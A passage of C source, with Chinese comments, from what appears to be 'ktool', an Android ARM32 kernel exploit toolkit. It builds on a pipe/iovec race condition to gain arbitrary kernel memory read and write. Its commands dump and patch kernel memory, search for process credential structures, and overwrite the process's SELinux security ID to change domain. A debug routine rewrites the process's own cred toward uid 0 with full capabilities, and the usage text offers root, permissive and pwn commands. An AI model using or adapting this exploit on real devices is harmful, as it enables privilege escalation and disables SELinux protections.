	}
	if (kread(p + OFF_TASK_REALCRED, b, 8) != 0) {
		fprintf(stderr, "setsid: cred read failed\n");
		return 2;
	}
	cred = *(uint32_t *)(b + 4);
	if (kread(cred + OFF_CRED_SECURITY, b, 8) != 0) {
		fprintf(stderr, "setsid: security read failed\n");
		return 2;
	}
	sec = *(uint32_t *)b;
	if (!sec) {
		fprintf(stderr, "setsid: security is NULL\n");
		return 2;
	}
	if (!strcmp(argv[2], "init_shell"))
		sid = 254;              /* 本机 policy：u:r:init_shell:s0 */
	else
		sid = (uint32_t)strtoul(argv[2], NULL, 0);

	/* 必须按 8 字节写（读改写）：kread/kwrite 只支持 8 的倍数，
	 * 单独写 4 字节会走到非法路径。这里保留 osid，只替换 sid。 */
	{
		uint32_t pair[2];

		if (kread(sec + 0, pair, 8) != 0) {
			fprintf(stderr, "setsid: tsec read failed\n");
			return 2;
		}
		printf("setsid: cred=%08x tsec=%08x osid=%u sid=%u -> %u\n",
		       cred, sec, pair[0], pair[1], sid);
		pair[1] = sid;
		fflush(stdout);

		/*
		 * 只写一次，**不做读回校验**。
		 *
		 * 改 sid 就是改本进程的 SELinux 域，写进去的一瞬间域就变了。
		 * iovyroot 的 pipe/iovec 原语在新域下的表现和旧域不同，
		 * 继续 kread 读回会失败 —— 原来用 kwrite_verify 重试 30 次，
		 * 表现为「第一次能过，之后连续 sid write failed」，让人误判写失败。
		 * 而实际写入早已落地（否则后面的 mount 不会成功）。
		 *
		 * 域到底改没改，唯一可靠的外部证据是 exec 之后看
		 * /proc/self/attr/current，不依赖任何内核内存读。
		 */
		if (kwrite(sec, pair, 8) != 0) {
			fprintf(stderr, "setsid: write failed\n");
			return 3;
		}
		fprintf(stderr, "setsid: sid -> %u written (unverified)\n", sid);
	}
	fflush(stdout);

	if (argc <= 3) {
		fprintf(stderr,
			"setsid: no command given — sid change dies with this process.\n"
			"        use: setsid init_shell sh -c 'cat /proc/self/attr/current'\n");
		return 0;
	}
	execvp(argv[3], argv + 3);
	fprintf(stderr, "setsid: exec %s: %s\n", argv[3], strerror(errno));
	return 127;
}

static int ktool_dispatch(int argc, char **argv);
static int ktool_repl(void);

int main(int argc, char **argv)
{
	int i;
	pthread_t th[3];
	const char *prog = argv[0];

	char dev[64], ver[128];

	/* P4.86-D9：全局 IO 预算，写在最前面：ktool -t <秒> <命令> ...
	 * 只影响读写重试的总时长，不影响命令语义。0/缺省 = 不限。 */
	while (argc > 2 && (!strcmp(argv[1], "-t") || !strcmp(argv[1], "--timeout"))) {
		g_timeout_sec = atoi(argv[2]);
		argc -= 2;
		argv += 2;
	}

	if (argc < 2) {
		fprintf(stderr,
			"usage: %s [-t sec] target | dump <hexaddr> <len> | root | sh | permissive |\n"
			"          patch | unpatch | enforce [--noflush] | flush | pwn [cmd]\n"
			"          kread_file <addr> <len> <out> [-r] | kwrite_file <in> <addr> [-n]\n"
			"          undo                              用 undo 日志还原上次写入\n"
			"          scan <start> <len> <pat|s:text> [max]\n"
			"          scan4 <start> <len> <v|lo-hi> [max] [-u]\n"
			"          findcred <start> <len> [max]      按 cred 形状找对象\n"
			"          walk <sym|addr> <off>... [-d n]   指针追踪（P4.85）\n"
			"          fld <addr> <off:type>...          按字段读结构\n"
			"          dis <addr> [n]                    ARM32 反汇编（保守解码）\n"
			"          sym <name|0xaddr> [-a] [-f map] [-n max]\n"
			"          bench [addr] [n]                  读吞吐基准（P4.86）\n"
			"          setsid <sid|init_shell> <cmd...>  改当前进程 sid 后 exec（救援）\n"
			"          repl                              交互会话（P4.85）\n",
			prog);
		return 1;
	}

	/* 目标识别：主键是「机型 + 内核 version 串」。
	 * 匹配不到就拒绝执行任何地址类操作——宁可不动，也不能按机型猜地址写内核内存。 */
	kt_prop("ro.product.device", dev, sizeof(dev));
	kt_kernel_ver(ver, sizeof(ver));
	g_t = kt_select_target(dev, ver);
	if (!strcmp(argv[1], "target"))
		return kt_cmd_target();
	if (!strcmp(argv[1], "sym"))
		return kt_cmd_sym(argc, argv);
	if (!strcmp(argv[1], "backend") && argc == 2) {
		printf("backend: %s\n", g_krw ? g_krw->name : "(none)");
		printf("limits : read<=%u, write<=%u, len 需 8 的倍数\n",
		       g_krw ? g_krw->max_read : 0, g_krw ? g_krw->max_write : 0);
		printf("用法   : backend probe   （走真实竞态读一次 init_task 自检）\n");
		return 0;
	}
	if (!g_t) {
		fprintf(stderr, "refuse: 没有匹配的 target，见上面的 supported targets\n");
		return 2;
	}

	for (i = 0; i < 2; i++)
		pthread_create(&th[i], NULL, spinner, NULL);
	sleep(2);

	if (pipe(pfd) != 0) { perror("pipe"); return 1; }
	fcntl(pfd[0], F_SETFL, fcntl(pfd[0], F_GETFL) | O_NONBLOCK);

	p0 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	p2 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	pR = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	wbuf = mmap(NULL, TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	rbuf = mmap(NULL, TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	canary_pg = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (!p0 || !p2 || !pR || !wbuf || !rbuf || !canary_pg) { perror("mmap"); return 1; }
	memset(wbuf, 0xA5, TOTAL);

	memset(viv, 0, sizeof(viv));
	viv[0].iov_base = p0;
	viv[1].iov_base = pR;
	viv[2].iov_base = p2;

	memset(siv, 0, sizeof(siv));

	udpfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (udpfd < 0) { perror("socket"); return 1; }
	{
		struct sockaddr_in sa;
		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(5105);
		sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		connect(udpfd, (struct sockaddr *)&sa, sizeof(sa));
	}

	pthread_create(&th[2], NULL, zapper, NULL);
	while (!ready) usleep(200);
	pin(0);

	/* 会话模式：backend 只初始化这一次，之后每条命令复用 */
	if (!strcmp(argv[1], "repl") || !strcmp(argv[1], "shell") ||
	    !strcmp(argv[1], "-i"))
		return ktool_repl();

	return ktool_dispatch(argc, argv);
}

/*
 * 命令分发。
 *
 * P4.85 把原来摊在 main 里的 if 链抽出来，原因是"会话化"：
 * 一次性模式下它只跑一次；REPL 模式下同一个进程反复调用它，
 * 于是 pipe / mmap / 精灵线程 / 竞态预算都只付一次成本，
 * 而且 `promote` 升的权限对后续命令持续有效。
 *
 * 约定与 main 一致：argv[1] 是命令名（argv[0] 只是个占位）。
 */
static int ktool_dispatch(int argc, char **argv)
{
	int i;

	if (!strcmp(argv[1], "setsid"))
		return ktool_cmd_setsid(argc, argv);
	unsigned long addr = 0;
	int len = 0;

	/* 每条命令从干净的读写预算开始：扫描会把 g_max_tries 降到 24，
	 * 万一某条异常路径没恢复，会话里后续命令就会莫名"读不到"。 */
	g_max_tries = 300;
	g_quiet = 0;
	g_io_deadline = g_timeout_sec ? time(NULL) + g_timeout_sec : 0;

	/* 这三条在 main 里已经处理过（不需要 backend），这里再放一份是为了 REPL：
	 * 会话里敲 target/sym 不该被当成未知命令。一次性模式走不到这里。 */
	if (!strcmp(argv[1], "target"))
		return kt_cmd_target();
	if (!strcmp(argv[1], "sym"))
		return kt_cmd_sym(argc, argv);
	if (!strcmp(argv[1], "backend") && argc == 2) {
		printf("backend: %s\n", g_krw ? g_krw->name : "(none)");
		printf("limits : read<=%u, write<=%u, len 需 8 的倍数\n",
		       g_krw ? g_krw->max_read : 0, g_krw ? g_krw->max_write : 0);
		printf("用法   : backend probe   （走真实竞态读一次 init_task 自检）\n");
		return 0;
	}

	if (!strcmp(argv[1], "dump") || !strcmp(argv[1], "read")) {
		if (argc < 4) { fprintf(stderr, "need addr len\n"); return 1; }
		addr = strtoul(argv[2], NULL, 16);
		len = atoi(argv[3]);
		/* dump 是 hexdump，4096 往上没人看；read 是二进制，放宽到 16MB */
		if (len <= 0 || (len > 4096 && !strcmp(argv[1], "dump")) ||
		    len > (16 << 20)) {
			fprintf(stderr, "bad len（dump<=4096, read<=16MB）\n");
			return 1;
		}
	}

	/*
	 * backend probe 必须放在这里：kread 依赖上面已建好的 pipe / mmap / 精灵，
	 * 放在参数解析阶段会用到未初始化指针。
	 */
	if (!strcmp(argv[1], "backend")) {
		int r = (g_krw && g_krw->probe) ? g_krw->probe() : -1;

		printf("backend: %s\n", g_krw ? g_krw->name : "(none)");
		printf("probe(init_task=%#lx): %s\n",
		       g_t->init_task, r == 0 ? "OK" : "FAIL");
		return r == 0 ? 0 : 3;
	}

	/*
	 * P4.86 bench：读吞吐基准（重试次数 + 单次耗时）。
	 * 判断"慢"是慢在竞态重试还是慢在固定开销——没有这个数就没法定 C8 的方向。
	 */
	if (!strcmp(argv[1], "bench")) {
		unsigned char b[8];
		struct timespec t0, t1;
		unsigned long a = g_t->init_task, tries0;
		int n = 20, i, ok = 0;
		long ms;
		double avg = 0.0;

		if (argc > 2)
			a = strtoul(argv[2], NULL, 16);
		if (argc > 3)
			n = atoi(argv[3]);
		if (n <= 0)
			return 1;
		tries0 = g_tries_sum;
		clock_gettime(CLOCK_MONOTONIC, &t0);
		for (i = 0; i < n; i++)
			if (kread(a, b, 8) == 0)
				ok++;
		clock_gettime(CLOCK_MONOTONIC, &t1);
		ms = (t1.tv_sec - t0.tv_sec) * 1000L +
		     (t1.tv_nsec - t0.tv_nsec) / 1000000L;
		if (ok)
			avg = (double)(g_tries_sum - tries0) / ok;
		printf("bench %d x 8B @%08lx: ok=%d  %ld ms  %.1f ms/read  "
		       "avg tries %.1f  backoff=%s\n",
		       n, a, ok, ms, (double)ms / n, avg,
		       backoff_on() ? "on" : "off");
		return ok == n ? 0 : 2;
	}

	/*
	 * P4.83 kread_file：分块读 → 落盘。
	 * 为什么要它：dump 的上限是 4096 且只能 hex 刷屏，想把 hook 现场、
	 * 页表、task/cred 结构带回 PC 分析时根本不够用。
	 */
	if (!strcmp(argv[1], "kread_file")) {
		const char *outp;
		unsigned char *buf;
		int done = 0, chunk = (int)g_krw->max_read & ~7;
		int resume = argc > 5 && (!strcmp(argv[5], "-r") ||
					  !strcmp(argv[5], "--resume"));
		struct stat st;
		FILE *fo;

		if (argc < 5) {
			fprintf(stderr, "usage: kread_file <hexaddr> <len> <outfile> [-r|--resume]\n"
					"  -r, --resume  续传：outfile 已存在的长度视为已完成，从其后续读\n");
			return 1;
		}
		addr = strtoul(argv[2], NULL, 16);
		len = (int)strtoul(argv[3], NULL, 0);
		outp = argv[4];
		if (len <= 0 || chunk <= 0) {
			fprintf(stderr, "bad len\n");
			return 1;
		}
		if (resume && stat(outp, &st) == 0 && st.st_size > 0) {
			int have = (int)st.st_size;

			if (have >= len) {
				printf("已存在 %d 字节（>=%d），无需续传\n", have, len);
				return 0;
			}
			printf("resume: 跳过前 %d 字节，从 0x%08lx 继续\n", have,
			       addr + (unsigned long)have);
			addr += have;
			len -= have;
			done = 0;
		}
		buf = malloc(chunk);
		if (!buf)
			return 1;
		fo = fopen(outp, resume ? "ab" : "wb");
		if (!fo) {
			perror(outp);
			free(buf);
			return 1;
		}
		while (done < len) {
			int n = len - done;

			if (n > chunk)
				n = chunk;
			if (kread_buf(addr + done, buf, n) != 0) {
				fprintf(stderr, "\nread fail @ 0x%08lx（已写 %d/%d）\n",
					addr + done, done, len);
				fclose(fo);
				free(buf);
				return 2;
			}
			if (fwrite(buf, 1, n, fo) != (size_t)n) {
				perror("fwrite");
				fclose(fo);
				free(buf);
				return 1;
			}
			done += n;
			if (len > 8192)
				fprintf(stderr, "\r  %d/%d (%d%%)", done, len,
					done * 100 / len);
			fflush(fo);
		}
		if (len > 8192)
			fprintf(stderr, "\n");
		fclose(fo);
		free(buf);
		printf("wrote %d bytes: 0x%08lx..0x%08lx -> %s\n", len, addr,
		       addr + (unsigned long)len - 1, outp);
		return 0;
	}

	if (!strcmp(argv[1], "kwrite_file")) {
		const char *inp;
		unsigned char *buf;
		FILE *fi;
		long sz;
		int no_undo = argc > 4 && !strcmp(argv[4], "-n");

		if (argc < 4) {
			fprintf(stderr, "usage: kwrite_file <infile> <hexaddr> [-n]\n"
					"  -n 不写 undo 日志（默认会写 /data/local/tmp/ktool_undo.bin）\n");
			return 1;
		}
		inp = argv[2];
		addr = strtoul(argv[3], NULL, 16);
		fi = fopen(inp, "rb");
		if (!fi) {
			perror(inp);
			return 1;
		}
		if (fseek(fi, 0, SEEK_END) != 0 || (sz = ftell(fi)) <= 0) {
			fprintf(stderr, "empty file\n");
			fclose(fi);
			return 1;
		}
		rewind(fi);
		buf = malloc(sz);
		if (!buf || fread(buf, 1, sz, fi) != (size_t)sz) {
			fprintf(stderr, "read %s failed\n", inp);
			fclose(fi);
			free(buf);
			return 1;
		}
		fclose(fi);
		printf("write %ld bytes -> 0x%08lx (8 字节块，逐块校验%s)\n",
		       sz, addr, no_undo ? "，无 undo" : "，可回滚");
		if (kwrite_txn(addr, buf, (int)sz, !no_undo) != 0) {
			fprintf(stderr, "write failed\n");
			free(buf);
			return 2;
		}
		free(buf);
		printf("OK\n");
		return 0;
	}

	/*
	 * P4.86-B4：从 undo 日志还原上一次 kwrite_file 的目标区域。
	 * 用在"写失败且自动回滚也失败"或者进程已经退出的情况。
	 */
	if (!strcmp(argv[1], "undo")) {
		struct kt_undo_hdr h;
		unsigned char *buf;
		FILE *f = fopen(KT_UNDO_FILE, "rb");

		if (!f) {
			printf("没有 undo 日志（%s）\n", KT_UNDO_FILE);
			return 1;
		}
		if (fread(&h, sizeof(h), 1, f) != 1 || h.magic != KT_UNDO_MAGIC ||
		    h.len == 0 || h.len > (16u << 20)) {
			fclose(f);
			printf("undo 日志损坏\n");
			return 1;
		}
		buf = malloc(h.len);
		if (!buf || fread(buf, 1, h.len, f) != h.len) {
			fclose(f);
			free(buf);
			printf("undo 日志读取失败\n");
			return 1;
		}
		fclose(f);
		printf("undo %u bytes -> 0x%08lx\n", h.len, h.addr);
		if (kwrite_buf(h.addr, buf, h.len) != 0) {
			printf("还原失败\n");
			free(buf);
			return 2;
		}
		free(buf);
		printf("OK\n");
		return 0;
	}

	/*
	 * P4.83 scan：在内核内存里找字节序列。
	 * 用途：喷完图案后确认落点（msg_msg/ion/skb 都能喷唯一串）、
	 * 找 cred/task 里的已知指针、验证某个地址上到底是什么结构。
	 */
	if (!strcmp(argv[1], "scan")) {
		unsigned char pat[512], *win;
		const int WSZ = 32768;
		unsigned long start;
		int slen, patlen, maxhits = 20, hits = 0, off = 0, fails = 0, jitter = 0;

		if (argc < 5) {
			fprintf(stderr, "usage: scan <hexstart> <len> <pat|s:text> [maxhits]\n");
			return 1;
		}
		start = strtoul(argv[2], NULL, 16);
		slen = (int)strtoul(argv[3], NULL, 0);
		patlen = kt_parse_pattern(argv[4], pat, (int)sizeof(pat));
		if (patlen <= 0) {
			fprintf(stderr, "bad pattern（hex 字节或 s:文本）\n");
			return 1;
		}
		if (argc > 5)
			maxhits = atoi(argv[5]);
		if (slen <= 0 || maxhits <= 0) {
			fprintf(stderr, "bad len/max\n");
			return 1;
		}
		if (patlen > WSZ) {
			fprintf(stderr, "pattern too long\n");
			return 1;
		}
		win = malloc(WSZ + 8);
		if (!win)
			return 1;
		printf("scan 0x%08lx..0x%08lx  pattern(%d)=%02x%02x.. max=%d\n",
		       start, start + (unsigned long)slen - 1, patlen, pat[0],
		       patlen > 1 ? pat[1] : pat[0], maxhits);
		g_max_tries = 24;	/* 探测模式：空洞快速判决，见 g_max_tries 注释 */
		while (off < slen && hits < maxhits) {
			int n = slen - off, i;

			if (n > WSZ)
				n = WSZ;
			if (kread_buf(start + off, win, n) != 0) {
				int mapped;

				/* 24 次失败可能是真空洞，也可能只是这次竞态没中。
				 * 用一次 300 次的 8 字节读确认——读得到就是抖动，重来；
				 * 读不到才是空洞。宁可多花 100ms，也不能把有数据的页跳过去。 */
				g_quiet = 1;
				g_max_tries = 300;
				mapped = (kread_buf(start + off, win, 8) == 0);
				g_max_tries = 24;
				g_quiet = 0;
				if (mapped && jitter < 3) {
					jitter++;
					continue;
				}
				jitter = 0;
				if (++fails > 64) {
					fprintf(stderr, "连续读失败，停止 @0x%08lx\n",
						start + off);
					break;
				}
				/* 连续失败说明是成片的空洞，步长放大到 64KB */
				off += (fails > 3) ? 0x10000 : 0x1000;
				continue;
			}
			fails = 0;
			jitter = 0;
			for (i = 0; i + patlen <= n; i++) {
				if (memcmp(win + i, pat, patlen))
					continue;
				kt_print_hit(start + off + i, win + i,
					     patlen > 16 ? 16 : patlen);
				if (++hits >= maxhits)
					break;
			}
			if (n < WSZ)
				break;
			off += n - (patlen - 1);
		}
		free(win);
		printf("hits: %d%s\n", hits, hits >= maxhits ? " (达到上限)" : "");
		g_max_tries = 300;
		return hits ? 0 : 1;
	}

	/*
	 * P4.84 scan4：指针搜索。
	 * 手里有一个泄漏指针 X → 找"谁存着它"（X 的容器在哪个偏移）；
	 * 反过来给一个 lo-hi 范围（如全部内核镜像地址）→ 看某个结构里
	 * 有哪些内核指针。换机型标定 off_task_cred / off_cred_security 就靠这个。
	 */
	if (!strcmp(argv[1], "scan4")) {
		struct p_hit ph[KT_PHITS];
		unsigned char *win;
		const int WSZ = 32768;
		unsigned long start, lo, hi;
		int slen, maxhits = KT_PHITS, nh = 0, off = 0, fails = 0, jitter = 0;
		int unaligned = 0, isrange = 0, i;
		char *dash;

		if (argc < 5) {
			fprintf(stderr,
				"usage: scan4 <hexstart> <len> <value|lo-hi> [max] [-u]\n"
				"  value  单个 32 位值（指针或数据），如 0xc0c4f2a0\n"
				"  lo-hi  范围，如 0xc0008000-0xc1200000（找结构里的内核指针）\n"
				"  -u     连非 4 对齐的偏移一起报（默认只报对齐的）\n");
			return 1;
		}
		start = strtoul(argv[2], NULL, 16);
		slen = (int)strtoul(argv[3], NULL, 0);
		dash = strchr(argv[4], '-');
		if (dash) {
			*dash = 0;
			lo = kt_hexval(argv[4]);
			hi = kt_hexval(dash + 1);
			isrange = 1;
		} else {
			lo = hi = kt_hexval(argv[4]);
		}
		for (i = 5; i < argc; i++) {
			if (!strcmp(argv[i], "-u"))
				unaligned = 1;
			else
				maxhits = atoi(argv[i]);
		}
		if (slen <= 0) {
			fprintf(stderr, "bad len\n");
			return 1;
		}
		if (maxhits > KT_PHITS)
			maxhits = KT_PHITS;
		if (maxhits <= 0)
			maxhits = KT_PHITS;
		printf("scan4 0x%08lx..0x%08lx  %s 0x%08lx..0x%08lx  %s  max=%d\n",
		       start, start + (unsigned long)slen - 1,
		       isrange ? "range" : "value", lo, hi,
		       unaligned ? "unaligned" : "4-aligned", maxhits);
		if (slen > 0x40000)
			fprintf(stderr, "  提示：约 %d 次 2000B 读，预计 %d 秒\n",
				slen / 2000, slen / 2000 * 17 / 100);
		win = malloc(WSZ + 8);
		if (!win)
			return 1;
		g_max_tries = 24;	/* 同 scan：空洞快速判决 */
		while (off < slen && nh < maxhits) {
			int n = slen - off, k;

			if (n > WSZ)
				n = WSZ;
			if (kread_buf(start + off, win, n) != 0) {
				int mapped;

				g_quiet = 1;
				g_max_tries = 300;
				mapped = (kread_buf(start + off, win, 8) == 0);
				g_max_tries = 24;
				g_quiet = 0;
				if (mapped && jitter < 3) {
					jitter++;
					continue;
				}
				jitter = 0;
				if (++fails > 64) {
					fprintf(stderr, "连续读失败，停止 @0x%08lx\n",
						start + off);
					break;
				}
				off += (fails > 3) ? 0x10000 : 0x1000;
				continue;
			}
			fails = 0;
			for (k = 0; k + 4 <= n; k++) {
				unsigned long a = start + off + k;
				uint32_t v;

				if (!unaligned && (a & 3))
					continue;
				v = (uint32_t)win[k] | ((uint32_t)win[k + 1] << 8) |
				    ((uint32_t)win[k + 2] << 16) |
				    ((uint32_t)win[k + 3] << 24);
				if (v < lo || v > hi)
					continue;
				ph[nh].addr = a;
				ph[nh].val = v;
				ph[nh].base = 0;
				ph[nh].type = 0;
				ph[nh].name[0] = 0;
				if (++nh >= maxhits)
					break;
			}
			if (n < WSZ)
				break;
			off += n - 3;	/* 4 字节字可能跨窗口 */
		}
		free(win);
		kt_annotate(ph, nh);
		for (i = 0; i < nh; i++) {
			printf("0x%08lx: 0x%08lx", ph[i].addr, ph[i].val);
			/* 值落在符号表尾之后（多半是堆上的地址）就别硬套符号，
			 * 否则会印出 _end+0x3ad340d 这种没意义的"命中" */
			if (ph[i].base && ph[i].val - ph[i].base <= 0x100000)
				printf("  %c%s+0x%lx", ph[i].type, ph[i].name,
				       ph[i].val - ph[i].base);
			printf("\n");
		}
		printf("hits: %d%s\n", nh, nh >= maxhits ? " (达到上限)" : "");
		g_max_tries = 300;
		return nh ? 0 : 1;
	}

	/*
	 * P4.86-C6：按 cred 形状找对象。
	 * 判据全部取自适配表的 [B] 类偏移，不写死数字：
	 *   +off_cred_uid 起 8 个 u32 全相等且 < 0x10000（uid..fsgid）
	 *   +off_cred_caps 处至少一个非零（cap 集合）
	 * 用途：拿到一块 slab/页，直接把里面的 cred 挑出来。
	 */
	if (!strcmp(argv[1], "findcred")) {
		unsigned char *win;
		const int WSZ = 32768;
		unsigned long start, last = 0;
		int slen, maxhits = 16, hits = 0, off = 0, fails = 0, jitter = 0;
		int want_uid = -1;

		if (argc < 4) {
			fprintf(stderr,
				"usage: findcred <hexstart> <len> [-u uid] [maxhits]\n"
				"  -u uid  只报 uid 等于该值的（如 -u 2000 找 shell 的 cred）\n");
			return 1;
		}
		start = strtoul(argv[2], NULL, 16);
		slen = (int)strtoul(argv[3], NULL, 0);
		for (i = 4; i < argc; i++) {
			if (!strcmp(argv[i], "-u") && i + 1 < argc) {
				want_uid = (int)strtoul(argv[++i], NULL, 0);
			} else if (argv[i][0] != '-') {
				maxhits = atoi(argv[i]);
			}
		}
		if (slen <= 0 || maxhits <= 0) {
			fprintf(stderr, "bad len/max\n");
			return 1;
		}
		win = malloc(WSZ + 8);
		if (!win)
			return 1;
		printf("findcred 0x%08lx..0x%08lx  (uid@+0x%x caps@+0x%x",
		       start, start + (unsigned long)slen - 1, OFF_CRED_UID,
		       OFF_CRED_CAPS);
		if (want_uid >= 0)
			printf(", 只报 uid=%d", want_uid);
		printf(")\n");
		g_max_tries = 24;
		while (off < slen && hits < maxhits) {
			int n = slen - off, k;

			if (n > WSZ)
				n = WSZ;
			if (kread_buf(start + off, win, n) != 0) {
				int mapped;

				g_quiet = 1;
				g_max_tries = 300;
				mapped = (kread_buf(start + off, win, 8) == 0);
				g_max_tries = 24;
				g_quiet = 0;
				if (mapped && jitter < 3) {
					jitter++;
					continue;
				}
				jitter = 0;
				if (++fails > 64)
					break;
				off += (fails > 3) ? 0x10000 : 0x1000;
				continue;
			}
			fails = 0;
			jitter = 0;
			for (k = 0; k + OFF_CRED_CAPS + 16 <= n; k += 4) {
				uint32_t uid = kt_rd32(win + k + OFF_CRED_UID);
				uint32_t c0, c1;
				int j, ok = 1;

				if (uid >= 0x10000)
					continue;
				if (want_uid >= 0 && (int)uid != want_uid)
					continue;
				for (j = 1; j < 8; j++)
					if (kt_rd32(win + k + OFF_CRED_UID + j * 4) != uid) {
						ok = 0;
						break;
					}
				if (!ok)
					continue;
				c0 = kt_rd32(win + k + OFF_CRED_CAPS);
				c1 = kt_rd32(win + k + OFF_CRED_CAPS + 8);
				if (!c0 && !c1)
					continue;
				/*
				 * cap 掩码不会长成内核指针。.bss 里大片 0 中间
				 * 夹个指针就能凑出"8 个 0 + 非零"的形状。
				 * ARM32 的 cap 位最多到 36 位，所以两个字要么是全 1
				 * （满 caps），要么高 4 位必须是 0；高 4 位非 0 的
				 * 一律当指针排除。
				 */
				if ((c0 != 0xffffffffU && (c0 >> 28)) ||
				    (c1 != 0xffffffffU && (c1 >> 28)))
					continue;
				/*
				 * 形状匹配必然有位移误报——真 cred 内部换个起点
				 * 也能凑出"8 个相等的 uid + 非零 caps"。
				 * cred 至少 0x60 字节，落在上一个命中 0x60 之内的
				 * 一律视为同一个对象的内部错位，不重复报。
				 */
				if (last && start + off + k - last < 0x60)
					continue;
				last = start + off + k;
				printf("0x%08lx uid=%u caps=%08x/%08x\n",
				       start + off + k, uid, c0, c1);
				if (++hits >= maxhits)
					break;
			}
			if (n < WSZ)
				break;
			off += n - 3;
		}
		free(win);
		g_max_tries = 300;
		printf("hits: %d\n", hits);
		return hits ? 0 : 1;
	}

	/*
	 * P4.86-C8a：按字段读结构——一行的 struct template。
	 * fld <addr> <off:type>...  type: p 指针 / u u32 / h u16 / b u8 / s 串 / x hex4
	 * 例：fld 0xd2018440 0x1d0:p 0x2f8:p 0x2fc:p 0x304:s
	 */
	if (!strcmp(argv[1], "fld")) {
		unsigned long base;
		int j;

		if (argc < 4) {
			fprintf(stderr,
				"usage: fld <hexaddr> <off:type>...\n"
				"  type: p 指针(带符号标注) u u32 h u16 b u8 s 字符串 x hex4\n"
				"  例: fld 0xd2018440 0x1d0:p 0x2f8:p 0x2fc:p 0x304:s\n");
			return 1;
		}
		base = strtoul(argv[2], NULL, 16);
		for (j = 3; j < argc; j++) {
			char *colon = strchr(argv[j], ':');
			unsigned char b[17];
			unsigned long off;
			char ty;

			if (!colon) {
				printf("  %s: 缺类型（应为 off:type）\n", argv[j]);
				continue;
			}
			*colon = 0;
			off = strtoul(argv[j], NULL, 0);
			ty = colon[1];
			*colon = ':';
			if (kread_buf(base + off, b, 16) != 0) {
				printf("  +0x%03lx %c <read fail>\n", off, ty);
				continue;
			}
			b[16] = 0;
			switch (ty) {
			case 'p': {
				unsigned long v = kt_rd32(b);
				char ann[160];

				if (kt_sym_fmt(v, ann, sizeof(ann)) == 0)
					printf("  +0x%03lx p  0x%08lx  %s\n", off, v, ann);
				else
					printf("  +0x%03lx p  0x%08lx\n", off, v);
				break;
			}
			case 'u':
				printf("  +0x%03lx u  %u (0x%x)\n", off, kt_rd32(b),
				       kt_rd32(b));
				break;
			case 'h':
				printf("  +0x%03lx h  %u\n", off,
				       (unsigned)(b[0] | (b[1] << 8)));
				break;
			case 'b':
				printf("  +0x%03lx b  %u\n", off, b[0]);
				break;
			case 's':
				printf("  +0x%03lx s  \"%s\"\n", off, (char *)b);
				break;
			case 'x':
				printf("  +0x%03lx x  %02x %02x %02x %02x\n", off,
				       b[0], b[1], b[2], b[3]);
				break;
			default:
				printf("  +0x%03lx ?  未知类型 '%c'\n", off, ty);
			}
		}
		return 0;
	}

	if (!strcmp(argv[1], "dis")) {
		unsigned long a;

		if (argc < 3) {
			fprintf(stderr, "usage: dis <hexaddr> [n<=64]\n");
			return 1;
		}
		a = strtoul(argv[2], NULL, 16);
		return kt_cmd_dis(a, argc > 3 ? atoi(argv[3]) : 16);
	}

	/*
	 * 调试专用（不进 usage）：在**本进程自己的 cred** 上试写，
	 * 用来定位"promote 写 72 字节失败"到底卡在 ktwrite 还是 readback 校验。
	 * 做法：先把 cred+4 的第一个字节翻转、写、读回看变没变，再写回原值。
	 * 只动一个字节且立刻还原，不影响进程状态。
	 */
	if (!strcmp(argv[1], "wtest")) {
		unsigned char orig[72], b[72], after[72];
		unsigned long p, cred;
		int len = argc > 2 ? atoi(argv[2]) : 72;
		int woff = argc > 3 ? atoi(argv[3]) : 0;
		int i, wok, rok;
		int full = (len == 0);

		if (full)
			len = 72;
		if (len <= 0 || len > 72 || (len & 7)) {
			fprintf(stderr, "len 须为 8..72 的 8 的倍数（0 = 完整 9 块模式）\n");
			return 1;
		}
		p = find_self();
		if (!p) { printf("find_self fail\n"); return 2; }
		if (kread(p + OFF_TASK_REALCRED, b, 64) != 0) return 2;
		cred = *(uint32_t *)(b + 4);
		printf("task=%08lx cred=%08lx len=%d off=%d%s deadline=%ld\n", p, cred,
		       len, woff, full ? " (完整模式)" : "",
		       g_io_deadline ? (long)(g_io_deadline - time(NULL)) : -1L);
		if (kread_buf(cred + 4, orig, len) != 0) { printf("读原值失败\n"); return 2; }
		memcpy(b, orig, len);
		if (full) {
			/* 完整复现 promote：9 个 8 字节块，每块写+读回校验 */
			int t0 = (int)time(NULL), bad = 0;

			memset(b, 0, 32);
			memset(b + (OFF_CRED_CAPS - 4), 0xff, 32);
			for (i = 0; i < len; i += 8) {
				int r = kwrite_verify_buf(cred + 4 + i, b + i, 8);

				printf("  block +%2d..+%2d: %s\n", i, i + 7,
				       r == 0 ? "ok" : "FAIL");
				if (r != 0)
					bad++;
			}
			printf("9 块结果：失败 %d 个，耗时 %ds，剩余预算 %lds\n", bad,
			       (int)time(NULL) - t0,
			       g_io_deadline ? (long)(g_io_deadline - time(NULL)) : -1L);
			rok = (kread_buf(cred + 4, after, len) == 0);
			printf("当前 uid=%d euid=%d（期望 0/0）\n", (int)getuid(),
			       (int)geteuid());
		} else {
			b[0] ^= 0xff;
			wok = (kwrite(cred + 4 + woff, b, len) == 0);
			rok = (kread_buf(cred + 4 + woff, after, len) == 0);
			if (rok) {
				int nd = 0, nb = 0;

				for (i = 0; i < len; i++) {
					if (after[i] != orig[i])
						nd++;
					if (after[i] != b[i])
						nb++;
				}
				printf("kwrite=%s readback=%s 变化字节=%d/%d  期望落地=%s\n",
				       wok ? "ok" : "FAIL", rok ? "ok" : "FAIL", nd, len,
				       nb == 0 ? "全部" : (nd == 0 ? "没有" : "部分"));
			} else {
				printf("kwrite=%s readback=FAIL\n", wok ? "ok" : "FAIL");
			}
		}
		printf("原: ");
		for (i = 0; i < len; i++)
			printf("%02x", orig[i]);
		printf("\n回: ");
		if (rok)
